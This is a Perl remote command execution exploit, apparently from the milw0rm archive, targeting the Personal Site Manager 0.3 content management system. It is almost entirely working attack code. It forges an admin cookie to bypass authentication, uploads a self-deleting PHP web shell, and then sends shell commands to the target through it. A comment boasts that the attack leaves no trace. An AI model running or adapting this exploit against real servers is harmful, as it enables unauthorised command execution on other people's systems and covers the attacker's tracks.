# --+++===========================================================================+++--
# --+++====== Personal Site Manager <= 0.3 Remote Command Execution Exploit ======+++--
# --+++===========================================================================+++--

#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;
use IO::Socket;

my $hostname = shift;
my $path = shift;
my $cmd = join " ", @ARGV;

usage () if (!$path);

open SHELL, ">shell.php";

# shell.php will be delete, it won't leave any trace about exploit's run
print SHELL "<? system (\$_GET ['cmd']); unlink ('shell.php'); ?>";
close SHELL;

my $url = "http://${hostname}${path}/psm/upload_file.php?submit=banane";
my $lwp = LWP::UserAgent->new;

# This CMS is also vulnerable to Insicure Cookie Handling
$lwp->default_header('Cookie' => "PSMADMIN=true");

my $req = $lwp->request (
              POST $url,
              Content_Type => 'multipart/form-data',
               Content      => [upload => ["shell.php"]],
             );
unlink ("shell.php");

if ($req->is_success)
{
    my $sock = new IO::Socket::INET (
        PeerHost => $hostname,
        PeerPort => 80,
        Proto    => "tcp",
    );
    print "\n[+] Running ${cmd}...\n\n";
    $cmd =~ s/ /%20/g;
    print $sock "GET ${path}/psm/datastore/files/shell.php?cmd=${cmd}\r\n\r\n";
    
    print $_ while (<$sock>);

    close ($sock);
    print "\n";
}
else
{
    print "[-] Unable to end execution.\n";
}

sub usage
{
    die "\n[+] Personal Site Manager <= 0.3 Remote Command Execution Exploit".
        "\n[+] Author  : darkjoker".
        "\n[+] Site    : http://darkjoker.net23.net".
        "\n[+] Download: http://garr.dl.sourceforge.net/sourceforge/psm/psm_0_3.zip".
        "\n[+] Usage   : perl ${0} <hostname> <path> <cmd>".
        "\n[+] Ex.     : perl ${0} localhost /PSM ls -l".
        "\n\n";
}

# milw0rm.com [2009-01-29]
